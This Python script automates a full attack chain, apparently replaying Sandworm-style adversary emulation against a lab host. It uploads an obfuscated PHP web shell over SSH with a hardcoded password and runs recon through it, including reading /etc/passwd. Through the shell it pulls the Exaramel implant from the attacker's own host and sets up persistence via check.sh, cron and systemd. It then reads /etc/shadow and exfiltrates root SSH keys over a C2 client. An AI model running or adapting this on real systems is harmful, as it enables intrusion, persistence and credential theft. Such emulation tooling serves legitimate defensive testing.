import os
import socket
import struct
import time

from rich import print


def execute_cmd(cmd):
    print(f"Executing command: {cmd}")
    os.system(cmd)


def ip_to_int(ip: str) -> int:
    """Convert an IPv4 address to a 32-bit integer."""
    return struct.unpack("!I", socket.inet_aton(ip))[0]


def int_to_ip(ip_int: int) -> str:
    """Convert a 32-bit integer to an IPv4 address."""
    return socket.inet_ntoa(struct.pack("!I", ip_int))


def invert_ip(ip: str) -> str:
    """Invert an IPv4 address."""
    ip_int = ip_to_int(ip)
    inverted_ip_int = ~ip_int & 0xFFFFFFFF  # Invert bits and ensure it's within 32 bits
    return int_to_ip(inverted_ip_int)


def get_ip(ip: str) -> str:
    if "hook_glibc_attacker.so" in os.environ.get("LD_PRELOAD", ""):
        return invert_ip(ip)
    return ip


ip = get_ip("192.168.0.5")
self_ip = get_ip("192.168.0.4")

cmds = [
    f"sshpass -p 'MYPASSWORD' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  sandworm/Resources/phpWebShell/obfuscated_webShell.php myuser@{ip}:/tmp/search.php",
    f"sshpass -p 'MYPASSWORD' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  myuser@{ip} 'sudo mv /tmp/search.php /var/www/html/'",
    f"curl -k 'https://{ip}/search.php?cmd=whoami'",
    f"curl -k 'https://{ip}/search.php?cmd=uname+-a'",
    f"curl -k 'https://{ip}/search.php?cmd=ls+-lsahR+/'",
    f"curl -k 'https://{ip}/search.php?cmd=cat+/etc/passwd'",
]

cmds2 = [
    "nohup ./controlServer > ./controlServer.log 2>&1 &",
    f'curl --insecure "https://{ip}/search.php?cmd=curl+--insecure+https://{self_ip}/getFile/Exaramel-Linux+-o+centreon_module_linux_app64"',
    f'curl -k "https://{ip}/search.php?cmd=ls+-lsah"',
    f'curl -k "https://{ip}/search.php?cmd=chmod+755+centreon_module_linux_app64"',
    f'curl -k "https://{ip}/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh"',
]


for cmd in cmds:
    execute_cmd(cmd)

os.chdir("wizard_spider/Resources/control_server")

for cmd in cmds2:
    execute_cmd(cmd)
    time.sleep(2)

slow_cmds = [
    f"nohup curl -k https://{ip}/search.php?cmd=/bin/backup > ./backup.log 2>&1 &",
    './evalsC2client.py --set-task exaramel-implant "persist cron"',
    './evalsC2client.py --set-task exaramel-implant "persist systemd"',
    './evalsC2client.py --set-task exaramel-implant "exec cat /etc/shadow"',
    './evalsC2client.py --set-task exaramel-implant "exec cat /root/.bashrc"',
    './evalsC2client.py --set-task exaramel-implant "get /root/.ssh/id_rsa caladan_id_rsa"',
    './evalsC2client.py --set-task exaramel-implant "get /root/.ssh/id_rsa.pub caladan_id_rsa.pub"',
    "ls -lsah files/",
]

for cmd in slow_cmds:
    execute_cmd(cmd)
    time.sleep(30)
